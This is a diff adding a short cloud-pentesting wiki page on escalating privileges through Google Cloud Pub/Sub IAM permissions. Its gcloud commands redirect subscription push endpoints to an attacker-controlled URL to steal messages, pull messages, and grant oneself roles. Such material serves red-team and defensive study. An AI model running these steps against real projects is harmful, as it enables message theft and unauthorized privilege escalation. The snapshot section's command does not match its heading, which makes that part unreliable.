@@ -1,0 +1,68 @@
+# GCP - Pubsub Privesc
+
+## PubSub
+
+Get more information in:
+
+### `pubsub.snapshots.create` (`pubsub.topics.attachSubscription`)
+
+The snapshots of topics **contain the current unACKed messages and every message after it**. You could create a snapshot of a topic to **access all the messages**, **avoiding access the topic directly**. 
+
+```bash
+gcloud pubsub subscriptions create <subscription_name> --topic <topic_name> --push-endpoint https://<URL_to_push_to>
+```
+
+### **`pubsub.snapshots.setIamPolicy`**
+
+Assign the pervious permissions to you.
+
+### `pubsub.subscriptions.create`
+
+You can create a push subscription in a topic that will be sending all the received messages to the indicated URL
+
+### **`pubsub.subscriptions.update`**
+
+Set your own URL as push endpoint to steal the messages.
+
+### `pubsub.subscriptions.consume`
+
+Access messages using the subscription.
+
+```bash
+gcloud pubsub subscriptions pull <SUSCRIPTION> \
+  --limit=50 \
+  --format="json" \
+  --project=<PROJECTID>
+```
+
+### `pubsub.subscriptions.setIamPolicy`
+
+Give yourself any of the preiovus permissions
+
+```bash
+# Add Binding
+gcloud pubsub subscriptions add-iam-policy-binding <SUSCRIPTION_NAME> \
+  --member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
+  --role="<ROLE_OR_CUSTOM_ROLE>" \
+  --project="<PROJECT_ID>"
+
+# Remove Binding
+gcloud pubsub subscriptions remove-iam-policy-binding <SUSCRIPTION_NAME> \
+  --member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
+  --role="<ROLE_OR_CUSTOM_ROLE>" \
+  --project="<PROJECT_ID>"
+
+# Change Policy
+gcloud pubsub subscriptions set-iam-policy <SUSCRIPTION_NAME> \
+  <(echo '{
+    "bindings": [
+      {
+        "role": "<ROLE_OR_CUSTOM_ROLE>",
+        "members": [
+          "serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com"
+        ]
+      }
+    ]
+  }') \
+  --project=<PROJECT_ID>
+```
